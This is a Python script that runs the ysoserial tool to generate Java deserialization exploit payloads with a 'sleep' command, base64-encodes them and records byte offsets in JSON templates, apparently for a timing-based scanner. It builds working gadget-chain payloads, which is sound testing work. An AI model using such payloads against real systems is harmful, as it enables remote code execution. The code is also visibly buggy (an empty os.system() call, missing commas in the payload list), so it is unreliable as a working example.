import os
import base64
import json
import difflib
import subprocess
import shlex

# java -jar ysoserial-0.0.6-SNAPSHOT-all.jar -h
PAYLOADS = ['BeanShell1',
            'C3P0',
            'Clojure',
            'CommonsBeanutils1',
            'CommonsCollections1',
            'CommonsCollections2',
            'CommonsCollections3',
            'CommonsCollections4',
            'CommonsCollections5',
            'CommonsCollections6',
            'FileUpload1',
            'Groovy1',
            'Hibernate1',
            'Hibernate2',
            'JBossInterceptors1',
            'JRMPClient',
            'JRMPListener',
            'JSON1',
            'JavassistWeld1',
            'Jdk7u21',
            'Jython1',
            'MozillaRhino1',
            'Myfaces1',
            'Myfaces2',
            'ROME',
            'Spring1'
            'Spring2'
            'URLDNS'
            'Wicket1']

PAYLOADS = [
            'Jdk7u21',
            ]


SLEEP_SAMPLES = {1: ['1', '2'],
                 2: ['11', '22']}

COMMAND = 'java -jar ysoserial-0.0.6-SNAPSHOT-all.jar %s "sleep %s"'


def get_payload_bin(payload, seconds):
    subprocess.check_output(shlex.split(COMMAND % (payload, seconds)))


for payload in PAYLOADS:

    payload_json = {"1": {"payload": None,
                          "offsets": []},
                    "2": {"payload": None,
                          "offsets": []}}

    # Generate the payloads
    for sleep_len, sleep in enumerate((1, 22)):
        args = (payload, sleep, payload, sleep)
        os.system()

        payload_file = '%s.%s' % (payload, sleep)

        if not os.path.exists(payload_file):
            break

        payload_bin = file(payload_file).read()
        os.remove(payload_file)

        payload_json[str(sleep_len + 1)]['payload'] = base64.b64encode(payload_bin)

    # Generate the offsets
    for sleep_len, sleep in enumerate((1, 22)):
        # Generate two samples for each payload
        for sleep_sample in SLEEP_SAMPLES:
            args = (payload, sleep_sample, payload, sleep_sample)
            os.system('java -jar ysoserial-0.0.6-SNAPSHOT-all.jar %s "sleep %s" > %s.%s' % args)

        # Now we get the offsets from the two samples
        sample_file_1 = '%s.%s' % (payload, SLEEP_SAMPLES[sleep_len + 1][0])
        sample_file_2 = '%s.%s' % (payload, SLEEP_SAMPLES[sleep_len + 1][1])

        if not os.path.exists(sample_file_1):
            break

        sample_bin_1 = file(sample_file_1).read()
        sample_bin_2 = file(sample_file_2).read()

        for a_index, b_index, size in difflib.SequenceMatcher(None, sample_bin_1, sample_bin_2).get_matching_blocks():
            if sample_bin_1[size: size + sleep_len + 1] == SLEEP_SAMPLES[sleep_len + 1][0]:
                payload_json[str(sleep_len + 1)]['offsets'].append(size)

        # Cleanup
        for sleep_sample in SLEEP_SAMPLES:
            sample_file = '%s.%s' % (payload, sleep_sample)
            if os.path.exists(sample_file):
                os.remove(sample_file)

    file('%s.json' % payload, 'w').write(json.dumps(payload_json, indent=4))

print('Remember to set the offsets in all json files!')
